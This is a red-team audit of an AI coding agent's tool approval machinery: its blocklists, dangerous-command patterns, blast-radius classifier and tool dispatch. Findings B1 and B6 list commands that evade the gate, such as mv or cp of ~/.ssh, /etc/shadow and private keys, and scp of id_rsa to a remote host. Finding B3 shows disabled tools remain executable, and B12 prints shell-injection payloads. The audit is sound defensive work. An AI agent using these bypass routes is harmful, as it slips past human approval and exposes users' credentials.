# Lane B — Tool Surface & Safety Machinery

**Lane:** B (of the 2026-11-16 operant architecture red-team + ponytail audit)
**Seam:** tool surface + its safety machinery
**Pinned revision:** `25b86ae5` (confirmed `git rev-parse --short HEAD` → `25b86ae5`)
**Re-verified at:** `71af1dcf` — the only commit in between (`feat(iter-2473)`, /bar retraction + ComposerBg) touches **zero** files in this seam (`git diff --name-only 25b86ae5 71af1dcf -- <seam paths>` is empty); every cited line re-checked byte-identical at the newer HEAD. All findings stand at both.
**Started:** 2026-11-16T03:18Z · **Final:** 2026-11-16T03:31Z
**Status:** COMPLETE

---

## Files READ (exact)

- `crates/operant-core/src/tools/builtin.rs` — all 621 lines
- `crates/operant-core/src/approval.rs` — :40-120, :132-300 (HARDLINE_BLOCKLIST, regex compile), :299-436 (ALL_DANGEROUS_PATTERNS), :440-600 (ApprovalGuard, check_hardline_blocklist, check_dangerous_patterns, risk_level_for_category), :608-724 (check_tool_approval), :741-920 (SHELL_CARRYING_TOOLS, extract_command_from_args, justification), :975-1060 (strip_shell_comments, find_inline_comment, guardian_messages, parse_guardian_reply), :1723-1850 (guardian tests + shell-tool extractor drift tests), :1519-1620 (blast-radius layer tests)
- `crates/operant-core/src/blast_radius.rs` — :55-125 (BlastRadius, Boundedness, VerbKind, FINDER flags), :132-191 (vocab tables), :191-258 (basename, verb_kind, has_short_flag, is_flag, trim_flag), :258-390 (parse_segment, is_benign_dev, is_block_device), :392-495 (boundedness_of, sql_class, worst), :495-625 (rate_segment, classify), :629-700 (segments, INTERPRETER_VERBS), :686-800 (interpreter_script, glued_script, rejoin_tail), :847-920 (tokens, segments_full), :1010-1058 (UNRESOLVED_INTERPRETER, destructive_targets, unbounded_detail), :1058-1110 (DeniedPath, check_deny), :1110-1230 (Refusal, screen), :1237-1330 (tests)
- `crates/operant-core/src/tools.rs` — :296-340 (ToolExposure), :320-420 (OperantTool trait defaults, ToolContext, resolved_session_id), :450-470 (normalize_arg_keys), :470-530 (ToolExecutor, execute_with_timeout), :560-700 (registry struct, builtin_tool_aliases, Clone, new, register, register_dyn), :700-800 (disable/enable/set), :800-860 (get_schemas_all, get_schemas), :890-985 (filtered schemas, is_available, len, contains, unregister, get), :1089-1230 (execute)
- `crates/operant-core/src/tools/aft_tools.rs` — :1-90 (register_aft_tools, 20 tools), :95-155 (project_root_from_context, guard_aft_path), :126-155 (guard_aft_write), :190-300 (AftReadTool), :520-600 (AftWriteTool, AftEditTool), name/description for all 20
- `crates/operant-core/src/tools/file_tools.rs` — :1-120 (DENIED_PATH_PATTERNS, atomic_write, umask), :240-345 (holon_write_fence, early_canonical, validate_path), :622-640, :762-775 (symlink handling in list)
- `crates/operant-core/src/tools/terminal_tool.rs` — :1-140 (args, rtk outcome), :140-340 (description, execute, rtk rewrite path, fence ordering, truncation markers)
- `crates/operant-core/src/tools/terminal_backend.rs` — :1-100 (SECRET_ENV_FRAGMENTS, sanitized_env), :100-160 (LocalBackend execute_command: direct vs shell)
- `crates/operant-core/src/tools/tool_search.rs` — :50-160 (assemble_tools), :270-330 (schema builders), :560-660 (ToolCallTool::execute), :991-1010 (bridge disable test), :1390-1420 (exposure stamping test)
- `crates/operant-core/src/tools/tool_search/name_recovery.rs` — :1-60 (module docs incl. the candidate-source contract), :55-200 (RECOVERY_THRESHOLD, Recovery, levenshtein_bounded, recover), :201-262 (resolve)
- `crates/operant-core/src/tools/code_execution.rs` — :1-120 (header, args, execute dispatch), :454-477 (execute_shell)
- `crates/operant-core/src/tools/patch_tool.rs` — :1-60 (PatchArgs)
- `crates/operant-core/src/tools/tool_state.rs` — :1-200 (ToolState, load/save disabled/deferred, apply_disabled_tools), :325-350 (test pinning get_schemas vs get_schemas_all)
- `crates/operant-core/src/tools/sourcehound_composites.rs` — :130-145 (spec count), :540-560 (composite_names), :770-830 (name-surface drift test)
- `crates/operant-core/src/tool_guardrails.rs` — :27-140 (thresholds, NO_EFFECT_TOOL_NAMES, PROGRESS_CLAIM_PHRASES), :142-240 (GuardrailDecision, RepeatPattern, tracker struct), :251-300 (observe head), :300-470 (observe tail, observe_result), :460-500 (last_pattern, exemptions), :499-600 (observe_output, count_of, reset, failure_streak), :596-640 (ping_pong_cycles), :640-830 (messages)
- `crates/operant-core/src/agent/stream.rs` — :700-760 (guardian_classify), :935-985 (duplicate-call mask, S2 timeout mask), :1089-1200 (args repair, guardrail observe), :1200-1260 (name recovery, sanitize + validate), :1263-1330 (approval gate head, guardian arm), :1330-1480 (seat policy, F2 unattended, headless deny), :1480-1560 (R48-2 flagged-call headless deny), :1560-1700 (permission channel, allowlist, AllowAlways/Deny), :1700-1770 (pending queue)
- `crates/operant-core/src/agent/mod.rs` — :160-200 (approval_mode field + doc), :290-310 (default "smart"), :1189-1220 (is_permission_gated_tool), :1280-1300 (allowlist_pattern_matches)
- `crates/operant-core/src/agent/run.rs` — :273-320 (tools_for_turn)
- `crates/operant-core/src/agent/builders.rs` — :68-90 (tool_allowed_by_allowlist), :100-290 (tracker + masked_tools construction) [grep]
- `crates/operant-core/src/schema.rs` — :223-360 (sanitize_args), :422-450 (validate_args)
- `crates/operant-core/src/tools/kernel/runtime.rs` — :15-80 (BridgeExecutor, execute_bridged), :94-135 (KernelRuntime::new, install_executor)
- `crates/operant-core/src/verification.rs` — :257-272 (run_phase, `sh -c`), :398-415 (start command, `sh -c`)
- `crates/operant-core/src/cronjobs/scheduler.rs` — :374-380, :458-470 (run_script_job) [grep]
- `crates/operant-core/src/config.rs` — :700-760 (BehaviorSettings head), :1265, :914-920 (guardian_llm) [grep]
- `crates/operant-core/src/config_registry.rs` — :1424-1432 (kernel tool_bridge keys)
- `crates/operant-cli/src/main.rs` — :1240-1300 (agent_config builder), :1310-1500 (AFT registration, aft_replaced_tools), :1590-1650 (set_disabled_tools / apply_disabled_tools wiring)
- `crates/operant-cli/src/cmd_context.rs` — :995-1015 (per_tool_schemas: get_schemas NOT _all), :1850-1885 (the budget round-trip test), :757-790 (tool_state wiring)
- `crates/operant-cli/src/cmd_tools.rs` — :95-120 (`operant tools list` uses get_schemas_all)
- `crates/operant-cli/src/gateway_runner.rs` — :90-180 (no_channel_verdict, unattended_no_channel_verdict), :2320-2360, :2864-2910 (resolve_pending_permission), :3270-3290, :8680-8790 (socket-approval test)
- `operant.example.toml` — :14-26 (command_allowlist), :195-205 (guardian_llm)
- `docs/audit/2026-06-19-BUGS.md` — :1878-1895, :6335-6365 (R47-1/2/4 record)

## Files NOT read (named explicitly)

`tools/`: `async_delegation.rs` (2047), `browser_cdp_tool.rs`, `browser_dialog_tool.rs`, `browser_tool.rs`, `cdp_utils.rs`, `checkpoint_tool.rs` (2155), `clarify_tool.rs`, `cli_discovery.rs`, `cli_help_parser.rs`, `cli_roster.rs`, `config_tool.rs`, `cron_tool.rs`, `ctx_tools.rs`, `datetime_tool.rs`, `debug_helpers.rs`, `delegation_output_schema.rs`, `discord_tool.rs`, `env_probe_tool.rs`, `evidence_recall.rs`, `file_state.rs`, `foreground_swarm.rs`, `harness_tools.rs`, `home_assistant_tool.rs`, `http_tool.rs`, `image_generation_tool.rs`, `insights_tool.rs`, `kanban_tool.rs`, `lcm_tools.rs` (1711), `learning_mutation_tool.rs`, `mcp_tool.rs`, `memory_tools.rs` (1365), `notification_tool.rs`, `osv_check.rs`, `platform_bases.rs`, `process_tool.rs` (args only), `reaction_tool.rs`, `send_message_tool.rs`, `session_search_tool.rs`, `skills_tool.rs` (3876), `sop_tool.rs`, `sourcehound.rs` (1988), `sourcehound_update.rs`, `spotify_tool.rs`, `sub_agent_tool.rs` (4175), `todo_tool.rs` (1487), `tool_backend_helpers.rs` (head only), `transcription_tool.rs`, `tts_command_provider.rs`, `tts_provider.rs`, `tts_registry.rs`, `tts_tool.rs`, `verification_tool.rs`, `video_analysis_tool.rs`, `vision_tool.rs`, `web_tools.rs`, `working_diff_tool.rs`.
Top level: `tools.rs` :530-560 + :1230-1881 (tests), `aft_bridge.rs` (grep only — 1518 LOC), `blast_radius.rs` :1330-1754 (tests), `tool_guardrails.rs` :830-1886 (tests), `process_registry.rs` (609), `rate_limiter.rs` (557), `verification.rs` :1-256 + :272-728, `redaction.rs` (771).

**Consequence, stated honestly:** the ~30 unread tool bodies are the *capability* half of this seam. I verified the *gate* half (registration, approval, blast radius, guardrails, availability, dispatch) end to end. A tool body that itself shells out without going through `check_tool_approval` would be a hole I did not look for — the three I sampled (`code_execution`, `terminal_tool`, `aft_tools`) all funnel through the gate, but that is a sample, not a proof.

---

## Concept counts (measured at `25b86ae5`)

### Tools per registration path

| registration site | file:line | count | gate |
|---|---|---|---|
| `register_builtin_tools` unconditional `.register(..)` | builtin.rs:93-244 | **53** | none |
| …inside those: `register_memory_tools` | builtin.rs:75-79 | 2 | always |
| …inside those: `sourcehound_composites::register_composites` | builtin.rs:133 | **24** | each self-disables via `is_available()` when the `sourcehound` binary is absent |
| …inside those: kernel bridge (`kernel::register`) | builtin.rs:113-117 | 1 (`kernel_exec`) | `[tools.kernel] enabled`; **failure swallowed with `tracing::warn!`** (builtin.rs:116) |
| skills trio | builtin.rs:158-174 | 3 | `skills_autoload` |
| `mcp_management` | builtin.rs:228-230 | 1 | `mcp_manager: Option` |
| `tool_search` bridge trio | builtin.rs:236-244 | 3 | always |
| `delegate_task` | builtin.rs:296-313 | 1 | `_with_sub_agent` variant only |
| **AFT family** (`register_aft_tools`, CLI-called) | aft_tools.rs:35-90 | **20** | `config.tools.aft_enabled` (**default ON**) |
| `operant_os::tools::register_all` | main.rs:1395 | n/a | `is_holon_run() || config.holon.enabled` |
| LCM tools | main.rs:~1590 | 6 | config |
| WASM plugin tools | main.rs:~1493 | unbounded | feature `plugins-wasm` |
| MCP server tools | mcp.rs | unbounded | `[mcp] autoload` |

**`builtin_tool_names()`** (builtin.rs:318-398) = 65 literals + 24 composites = **89**. The 20 AFT names are absent → see B1.

### Guardrail classes (`tool_guardrails.rs`)

Thresholds: repeat-warn 3, repeat-skip-effect 3, repeat-skip-no-effect 4, window 20, ping-pong 4/5, no-progress 5/6, failures 8/12, hard-reject halt 2, output-repeat 4/5, progress-token 4/5.
**9 rungs**, `RepeatPattern` = 6 variants. State: 6 HashMaps + 1 bounded VecDeque; `reset()` per turn (run.rs:1221-1229) is the only bound on the run-wide maps.

### Blast-radius tiers

`BlastRadius` = 4 ordered (`None < Scoped < Unbounded < Device`); `Boundedness` = 2; `VerbKind` = **7** (Remove, RawWrite, Format, RecursiveMeta, Finder, Write, Vcs); `Refusal` = 3.

### Approval

`ApprovalMode` = 3 (Manual/Smart/Off, default Smart). `ApprovalVerdict` = 3. `RiskLevel` = 4. Layers: L1 hardline (14 categories / 39 patterns, substring+regex), L2 dangerous (12 categories / 46 regexes), L3 blast-radius + justification. `SHELL_CARRYING_TOOLS` = 7 names (approval.rs:741-756). `check_tool_approval` is called from **3** production sites: `agent/stream.rs:1264`, `tools/kernel/runtime.rs:48`, and (indirectly) `tui/app/channel_drains.rs:695` builds an `ApprovalGuard`.

---

## Findings

### B1 — [VERIFIED] **HIGH** — `blast_radius` models 7 verbs; the destructive verb a model reaches for most, `mv`, is not one of them, and nothing else covers it

**The structural hole.** `verb_kind()` (blast_radius.rs:199-221) maps exactly: `rm/unlink/shred/srm/rmdir/truncate` → Remove, `dd` → RawWrite, `tee` → Write, `chmod/chown/chgrp` → RecursiveMeta, `find` → Finder, `git` → Vcs, `mkfs*`/`fdisk`/`sfdisk`/`cfdisk`/`parted`/`wipefs`/`badblocks`/`hdparm`/`mkswap` → Format. **Everything else returns `None`.** `rate_segment`'s `match p.verb { None => BlastRadius::None, … }` (blast_radius.rs:546-547) turns an unmodelled verb into `None` — the lowest tier.

Consequence, traced through `screen()` (blast_radius.rs:1199-1225): `screen` returns `None` immediately when `classify() == None` (**:1201-1203**), so `destructive_targets()` (**the denied-path check**) is never even called.

Concrete failing cases, each verified against all three layers:

| command | L1 hardline | L2 patterns | L3 blast radius | verdict |
|---|---|---|---|---|
| `mv /etc /tmp/x` | miss | miss (`mv\s+/etc/` needs a trailing path) | `None` (verb unmodelled) | **allowed** |
| `mv /var/log /tmp/x` | miss | miss | `None` | **allowed** |
| `mv ~/.ssh /tmp/x` | miss | miss | `None` | **allowed** |
| `mv $HOME /tmp/x` | miss | miss | `None` | **allowed** |
| `cp /etc/shadow /tmp/x` | miss | miss | `None` | **allowed** |
| `cp ~/.ssh/id_rsa /tmp/x` | miss | miss | `None` | **allowed** |
| `rsync -a /etc/ /tmp/x` | miss | miss | `None` | **allowed** |
| `install -m 644 /etc/shadow /tmp/x` | miss | miss | `None` | **allowed** |

Contrast the same targets through a modelled verb — `rm -rf /etc` → L1 `"rm -rf /etc"` + L3 `DeniedPath{system directory}`; `rm -rf ~` → L3 `DeniedPath{home root}`; `dd of=/dev/sda` → L3 `DeniedPath{system directory}`. So the deny list is real and it is keyed entirely on the verb being in the 7-item table.

Why it matters: the blast-radius module's own doc calls it *"Defense in depth, NOT a sandbox"* and approval.rs:654-658 states the layers are the whole enforcement story. The **deny path** list (`DENIED_SYSTEM_DIRS`, home root, `.git`, filesystem root — blast_radius.rs:1070-1108) is the strongest thing in the seam and it is unreachable for any command whose verb is not one of the 7. Moving `~/.ssh` or `/etc/shadow` to `/tmp` is a textbook exfiltration and the gate says "allowed" with `risk_level: None`.

Fix: (a) add `mv`/`cp`/`rsync`/`install`/`scp` to `verb_kind` (they are *productive* verbs whose targets must be screened — `mv` is Remove-shaped for its source, `cp` is Write-shaped for its destination), or (b) make `rate_segment`'s `None` arm consult `check_deny` on every positional token regardless of verb. (b) is the smaller change and closes the whole class: *any* segment naming a denied path should be refused, whatever the verb.

### B2 — [VERIFIED] **HIGH** — `approval_mode` is a dead knob: the operator cannot set it, and its documented value `"manual"` is unreachable

`AgentConfig.approval_mode` (agent/mod.rs:171) is read in exactly one place: `stream.rs:1263-1267`. It is set in exactly one production place: the `Default`/`From` impl at `agent/mod.rs:299` (`"smart"`). Verified by exhaustive grep across all workspace crates:

- `crates/operant-cli/**`: **0** hits for `approval_mode` — `agent_config()` (main.rs:1243-1300) never sets it.
- `crates/operant-config/**`, `crates/operant-os/**`: **0** hits.
- `crates/operant-core/src/config.rs`: **0** hits — there is no config field for it, and `BehaviorSettings` (`config.rs:716`) has no such key.
- `operant.example.toml`: no `approval_mode` key (only `command_allowlist` and `guardian_llm`).
- The only other writes are test fixtures (`"off"`).

So the three modes documented at `agent/mod.rs:169-171` — *"smart" (default, pattern-based), "manual" (prompt for every tool), or "off" (no checks)"* — are all unreachable from operator config. `"smart"` is what always runs. The kernel bridge's copy is worse: `approval_mode: None` hardcoded with the comment *"Smart default; explicit modes arrive via config later"* (kernel/runtime.rs:125) — that "later" never arrived.

Why it matters, two ways:
1. **A user who wants "manual" (approve every single tool call) cannot get it.** The strictest posture the system documents is unavailable. For a deployment where the operator wants a human veto on every tool, the only path is `guardrail_exempt_tools`-style config, which is a different axis.
2. **A user who sets `approval_mode = "off"` in `operant.toml` gets no error and no effect** — the key is not in `deny_unknown_fields`-covered `BehaviorSettings`, so it may be silently dropped or rejected depending on where it lands. Either way the operator believes the gate is disabled and it is not (fail-safe direction), or believes it is on and it is not configurable.

Fix: add `approval_mode` to `BehaviorSettings` (serde default `"smart"`), thread it through `agent_config()`, and pass it into `BridgeExecutor::install_executor` instead of `None`. Add a config test pinning the round-trip, the same shape as `guardian_llm`'s.

### B3 — [VERIFIED] **MED** — `registry.execute()` does not enforce the disabled set; the AFT dedup disables `terminal` but `terminal` still executes

Traced end to end:

- `ToolRegistry::execute` (tools.rs:1089-1103) resolves the alias, `tools.get(&resolved).cloned()`, dispatches. It **never reads `disabled_names` / `disabled_toolsets` / `is_available`**.
- `get_schemas` (tools.rs:829-856) and `get_available_schemas_filtered` (tools.rs:890-925) DO filter on `is_available()` + both disabled sets. `is_available` (tools.rs:968-980) is correct and documented as the guardrail-parity seam for the bridge.
- `tool_call` checks `is_available` first (tool_search.rs:620-630) with a regression test at :991.
- The agent's own path (`stream.rs:1763/1833/1920` → `registry.execute`) has **no** `is_available` check. Grep of `stream.rs` for `is_available`: 0 hits.

Concrete case, and it is not hypothetical — it is the **default configuration**. `main.rs:1471-1478` adds `terminal`, `file_read`, `file_write`, `patch`, `file_search`, `file_list` to the disabled set whenever the AFT bridge pings live, and `aft_enabled` defaults on. So in the default build `terminal` is disabled-but-callable: the model never sees its schema (so a well-behaved model never calls it) but `registry.execute("terminal", …)` runs it. Same for `file_read` — so the AFT dedup is a de-advertisement, not a ban.

Fix: check `is_available(&resolved)` at the top of `execute()` and return a `ToolResult::error` naming the disable. One RwLock read per call; makes the property structural instead of conventional. (Note `contains()`/`get()` have the same gap, but `name_recovery::resolve` reads `get_schemas()` — the filtered view — so recovery cannot resurrect a disabled name. That door is correctly closed; see B9.)

### B4 — [VERIFIED] **MED** — 20 registered AFT tools are absent from `builtin_tool_names()`, and the drift test works around it

`register_aft_tools` (aft_tools.rs:35-90) registers 20 tools. None appears in `builtin_tool_names()` (builtin.rs:318-398; grep for `aft` in builtin.rs yields 0 names). The invariant is stated in that function's own header (builtin.rs:391-395): *"sourcehound's v2 composites (RT-194) ride the same registration path as every other builtin, so they belong in the same name surface — that is what `operant tools list` reports and what `tools disable` matches."* AFT is on by default and is the default shell surface, so the same reasoning applies with more force.

Two traced consequences:
1. `operant tools list` (cmd_tools.rs:103, via `get_schemas_all`) and the disable matcher work off the registry, so the *CLI* does see AFT — but `builtin_tool_names()` is the **advertised** surface the tests and any future consumer key on, and it under-reports by 20.
2. The extractor drift test has to hardcode `const CONDITIONALLY_REGISTERED: &[&str] = &["kernel_exec", "aft_bash"]` (approval.rs:1819) **precisely because** `aft_bash` is missing from the list. That is a test absorbing the defect rather than catching it.

Fix: derive the AFT names from the same table that registers them (the `sourcehound_composites::composite_names()` pattern), then delete the `CONDITIONALLY_REGISTERED` exemption.

### B5 — [VERIFIED] **MED** — the `file_write` extractor truncates the payload at 100 bytes, so layer 3 judges a prefix

`extract_command_from_args`'s `file_write` arm (approval.rs:807-815): `if content.len() > 100 { format!("file_write: {} ({} bytes)", path, content.len()) }` — the content is **dropped** above 100 bytes. Compare the module's own stated rule for the `verify_task` arm (approval.rs:851-855): *"the gate must judge EXACTLY the text the shell judges, so a command gets the same verdict through this tool as through `terminal`."* For `file_write` the rule is inverted: a 200-byte body whose first 100 bytes are `# a comment` and whose remainder is `rm -rf ~` is screened as the benign prefix.

Scope, stated honestly: `file_write`'s payload is file *content*, not a shell command, and the blast-radius classifier parses shell verbs — so it would not have rated the body anyway. The **path** is included in both branches, and the real boundary is `holon_write_fence` + `validate_path` at the tool (file_tools.rs:319-341), which is unaffected. So this is a consistency defect against the module's own rule, not a demonstrated write-outside-roots. Fix is one line: never truncate the string handed to the gate.

### B6 — [VERIFIED] **LOW** — layer 2's table is not a classifier; layer 3 is what covers its gaps, and nothing says so

`check_dangerous_patterns` (approval.rs:561-577) is first-match-wins over 46 regexes in 12 categories. Verified gaps (re-implemented the table and tested):

| command | L1 | L2 | L3 | net |
|---|---|---|---|---|
| `dd of=/dev/sda bs=1M` | miss (needs `dd if=`) | miss (`dd\s+if=/dev/zero`) | **Device** (RawWrite + `of=`) | caught by L3 only |
| `mv /etc /tmp/x` | miss | miss | miss (B1) | **not caught** |
| `rsync -a /etc/ ./b` | miss | miss | miss (B1) | **not caught** |
| `scp ~/.ssh/id_rsa h:/tmp` | miss | miss | miss (B1) | **not caught** |
| `git commit -m "fix eval order"` | miss | **hit** `\beval\b` | n/a | false positive (fail-safe) |

The false-positive row matters less than the pattern: `\beval\b` / `\bexec\b` as bare word matches (approval.rs:323-324) fire on ordinary prose in commit messages and comments. Fail-safe direction, so LOW, but it trains operators to click through prompts.

Fix: make the L3 doc (blast_radius.rs:52-57 / approval.rs:654-658) state that L3 is the load-bearing layer and L1/L2 are best-effort tripwires — then a future editor adding a shell-carrying tool knows which gate must not be bypassed.

### B7 — [VERIFIED] **LOW** — `aft_ast_replace` has no path guard; the code documents the gap instead of closing it

`guard_aft_write`'s doc (aft_tools.rs:126-133): *"`aft_ast_replace` names no path (AFT resolves its pattern internally) and stays behind the adapter's disabled_tools lists plus the kernel's workdir fingerprint."* No `validate_path`, no `holon_write_fence`. Its confinement is that it runs inside the AFT subprocess whose cwd is the project root — a real boundary, but a different and untested one. LOW: escaping needs an AFT-side escape, and the other AFT writers all carry `guard_aft_write`.

### B8 — [VERIFIED] **LOW** — `builtin.rs:113-117` swallows a kernel registration failure

```rust
if let Err(e) = super::kernel::register(registry, &crate::config::runtime_config().tools.kernel).await {
    tracing::warn!(target: "kernel", error = %e, "kernel tool registration failed");
}
```

A partial kernel registration leaves the registry in a state where `kernel_exec` is absent but nothing tells the operator at the surface they read. The blast-radius gate is not involved, but the same *shape* as B4: a conditional tool whose absence is invisible. LOW because the fallback (no kernel) is a supported configuration.

### B9 — [VERIFIED, no finding] — the socket approval path and name-recovery are correctly wired

Both were assigned as suspicions; both are correct, and I want that on the record:

- **Socket vs channel approval** (gateway_runner.rs:2864-2894 + test :8743): `resolve_pending_permission` keys the pending map by channel id (`telegram:42`) or session (`session:s1`) and refuses a socket answer unless `channel == format!("session:{requester_session}")`. A channel-owned ask has no session, so a socket approve is refused. The attended no-channel arm (`no_channel_verdict`, :116-126) returns `Deny` — its doc names the exact bug it fixed (`AllowSession` meant `operant chat --attach` silently removed the human veto). The seat consult (stream.rs:1365-1370) runs above the channel.
- **Name recovery vs disabled tools** (name_recovery.rs:47-52 + :201-212): `resolve` reads `get_schemas()` — registered AND available AND not-disabled — and the module doc states this is deliberate: *"Recovery therefore can never resurrect a tool the user disabled."* `tool_call`'s recovery has the matching guard (tool_search.rs:606-609) so it never launders a ban into a near-miss success.
- **`tool_call` cannot bypass a disable** (tool_search.rs:620-630 + test :991).
- **`get_schemas` vs `get_schemas_all` split** is deliberate and pinned by tests on both sides (tool_state.rs:325-345, cmd_context.rs:1853-1885): the filtered view is what the agent receives and what the budget measures; `_all` is the operator's listing.

### B10 — [VERIFIED] **LOW** — `tool_guardrails` state is bounded only by the per-turn `reset()`

6 HashMaps + 1 VecDeque. `name_window` is capped at 20 (tool_guardrails.rs:262-265). The rest are bounded by distinct (tool, args) / (tool, result-hash) pairs within one turn, and `reset()` (run.rs:1221-1229) is the only thing clearing them. A single turn with 10^5 distinct args holds 10^5 entries. Acceptable for a model loop; noted so nobody adds a long-lived tracker without moving the reset.

### B11 — [VERIFIED] **LOW** — no lock is held across an await in the registry; the one `std::sync::Mutex` is correctly documented

Checked every `read()/write().await` in tools.rs (681-980): each acquires, uses, and drops before any `.await`. `ToolExecutor::overrides` is a `std::sync::Mutex` with an explicit comment (tools.rs:414-419) explaining why it is not a tokio mutex (written once at boot from async context, read-copy per execution, never held across await) — correct. `masked_tools` and `tool_guardrails` in the agent are `std::sync::Mutex` with `.lock().unwrap_or_else(PoisonError::into_inner)` — poison-recovering, correct for a lock that must never be the reason a turn dies.

---

## Ponytail cut list

| item | LOC | verdict |
|---|---|---|
| `builtin_tool_names()` hand-maintained list of 65 literals (builtin.rs:318-389) | ~70 | **Cut the literals.** Derive from one table (`register_builtin_tools` already IS that table) so the advertised surface cannot drift from the registered one. The sourcehound half already proves the pattern (`composite_names()`); AFT is the counterexample (B4). |
| `CONDITIONALLY_REGISTERED` exemption in `shell_carrying_tools_have_extractor_arms` (approval.rs:1819) | 1 | **Cut after B4 is fixed** — it exists only to absorb AFT's absence from the advertised list. |
| `guard_aft_write` / `guard_aft_path` pair (aft_tools.rs:110-155) vs `validate_path` + `holon_write_fence` (file_tools.rs) | ~45 | **Keep, but the duplication is the risk.** Two families, two fences, one missing on `aft_ast_replace` (B7). A single `guard_file_write(tool, path)` that both families call would make the gap unrepresentable. |
| `ApprovalGuard` (approval.rs:446-511) — constructed per call in `check_tool_approval` (:624) | ~65 | **Keep the type, cut the per-call construction.** `check_tool_approval` builds an `ApprovalGuard` on every invocation to call one method; `ApprovalGuard` carries only a mode. Either free functions or a `OnceLock` per mode. |
| `risk_level_for_category`'s `_ => RiskLevel::Low` (approval.rs:585) | 1 | **Cut the wildcard.** An unmapped category should be a compile error or a loud `critical`, not silently `Low` — a new category added to `ALL_DANGEROUS_PATTERNS` without a risk mapping currently degrades to Low. |
| `operant-config/src/policy.rs::SecurityPolicy::command_risk_level` (1966 LOC, zero external callers) — the coordinator's finding | ~1966 | **DELETE.** Confirmed: it is a second, unused dangerous-command classifier. Lane B's live side is `approval.rs`, and having a 1966-LOC parallel implementation of the same safety rule is precisely how the two drift. |
| `guard_aft_path`'s duplicated suffix message (aft_tools.rs:113-121) repeating file_tools' text | ~6 | **Cut** — hoist the shared sentence. |
| `terminal_tool.rs`'s `RtkOutcome` 4-variant enum | ~50 | **Keep.** It correctly separates "rtk denied" (operator policy) from "rtk missing" (fail open) from "no rewrite". This is the one place in the seam where a rewrite is explicitly forbidden from becoming a permission. |

Net deletable: **~2,100 LOC** (dominated by the `operant-config` duplicate classifier), plus the ~70-line hand-maintained name list.

---

## Rust discipline table

| rule | sites | file:line | verdict |
|---|---|---|---|
| no `unwrap()`/`expect()` in non-test lib code | 2, both justified | approval.rs:280, :296 | **PASS** — both are once-init static regex compiles with `#[expect]` + reason + a test (`hardline_regex_patterns_all_compile`) that fails on a bad literal. Correct use of the escape hatch. |
| no `anyhow` in lib crates | 0 hits in approval.rs / tool_guardrails.rs / blast_radius.rs / tools.rs / builtin.rs | — | **PASS** |
| typed errors in lib crates | `blast_radius::Refusal` (enum, 3 variants), `approval::ApprovalVerdict` (3), `GuardrailDecision` (4), `Recovery` (4) | blast_radius.rs:1118, approval.rs:60, tool_guardrails.rs:142, name_recovery.rs:58 | **PASS** — the safety seam uses enums, not strings, at every boundary. |
| `dyn Trait` only where heterogeneous | `Vec<Arc<dyn OperantTool>>`, `Box<dyn ModelClient>`, `ToolInterceptHandler` | tools.rs:562, :600 | **PASS** — the registry is legitimately heterogeneous; the trait's `toolset()`/`exposure()` defaults avoid per-impl boilerplate. |
| no clone-in-loop | none found in the read portion | — | **PASS** — `get_schemas*` clone the map's values into a Vec once per call, not per iteration; `execute` Arc-clones the one tool out of the lock. |
| no lock across await | all `RwLock` guards in tools.rs drop before any `.await` | tools.rs:681-980 | **PASS** (B11). |
| large enum variants | `ToolResult` carries `Option<String>`/`String`, not boxed structs | tools.rs | **PASS** — no oversized-variant smell in the seam. |
| `#[cfg_attr(not(test), allow(dead_code))]` justified | `SHELL_CARRYING_TOOLS` | approval.rs:740 | **PASS** — the const IS the contract the test enforces; the allow documents that. |
| unwrap in tests | widespread (`register_builtin_tools(...).await.unwrap()`) | builtin.rs:437 etc. | **PASS** — test targets are exempt by the gate's design. |
| config key documented in `operant.example.toml` | `approval_mode` has **no** config field at all | agent/mod.rs:171 | **FAIL** — see B2. The field is documented in rustdoc as operator-settable and is not. |

---

## Validation pass (post-completion, 2026-11-16T03:33Z)

The doc's own stated weakness was: *"~30 tool bodies went unread — a tool body that shells out without going through `check_tool_approval` would be a hole I did not look for."* I went and looked. Mechanical sweep, not reading:

```bash
# every tool body that spawns a process, non-test lines only
for f in crates/operant-core/src/tools/*.rs; do
  awk '/^#\[cfg\(test\)\]/{t=1} !t' "$f" | grep -cE 'Command::new|process::Command'
done
```

**8 tools spawn a process.** 3 of them were unread at the time of the original report. Result:

| tool | spawns | shell? | gate | verdict |
|---|---|---|---|---|
| `code_execution` | 11 | `sh -c` per language | `code_execution` arm (approval.rs:780-784) | already covered, B-noted |
| `terminal_backend` | 7 | `use_shell` flag | `terminal` arm (approval.rs:785-789) | already covered |
| `tts_tool` | 6 | `neutts`/`piper` argv, `python3 -c` at :795 | `tts` not in `is_permission_gated_tool`, but no shell metachar path (argv, not `sh`) | **see B12** |
| `checkpoint_tool` | 13 | no — `git` argv only | n/a (argv, no shell) | safe |
| `working_diff_tool` | 3 | no — `git` argv only | n/a | safe |
| `debug_helpers` | 2 | no — `hostname`/`rustc` argv | n/a | safe |
| `cli_discovery` | 2 | no — `Command::new(name)` argv | n/a | safe |
| `tts_command_provider` | 2 | **`sh -c`** at :138-140 | `tts` not gated | **see B12** |

**B12 — [VERIFIED] LOW — `tts_command_provider` runs `sh -c` on a rendered template, and is unreachable dead code**

`CommandProvider::synthesize` (tts_command_provider.rs:128-150) builds a command from `self.command_template` with `render_template` substituting placeholders, then executes it via `sh -c`. The model controls two of the substituted values — `TtsArgs.voice` (a free `String`, tts_tool.rs:56-57) and `TtsArgs.model` — and `tts`/`text_to_speech` is **not** in `is_permission_gated_tool` (agent/mod.rs:1190-1218). So the shape is exactly the one B5/B6 warned about: model-controlled text reaching a shell with no approval gate.

**Why it is LOW and not HIGH — the escaping is sound, and I proved it rather than assumed it.** `render_template` wraps every value in single quotes with `value.replace('\'', "'\\''")` (tts_command_provider.rs:83-84), the standard POSIX single-quote escape. Tested against a real `sh` with four injection classes:

| payload substituted for `{voice}` | result |
|---|---|
| `af_sky'; touch /tmp/pwned.txt; echo '` | literal, no execution |
| `$(touch /tmp/pwned.txt)` | literal |
| `` `touch /tmp/pwned.txt` `` | literal |
| `x; touch /tmp/pwned.txt` | literal |

**The remaining risk is the TEMPLATE, not the value** — `command_template` is substituted verbatim with no escaping (only the placeholders are quoted), so whoever authors the template authors the command. That is correct design for a config-authored command provider, but it means the trust boundary is the config file, not the model. And it is unreachable today: `register_command_provider` (tts_tool.rs:98) has **zero callers** in the workspace, `CommandProvider` appears in no config struct (`TtsSettings` at config.rs:2433-2439 carries only provider/enabled/voice), and the plugin registry's `register()` has no disk/config loader either. So `tts_command_provider.rs` is currently **dead code that would become a live shell surface the moment someone wires it to config**.

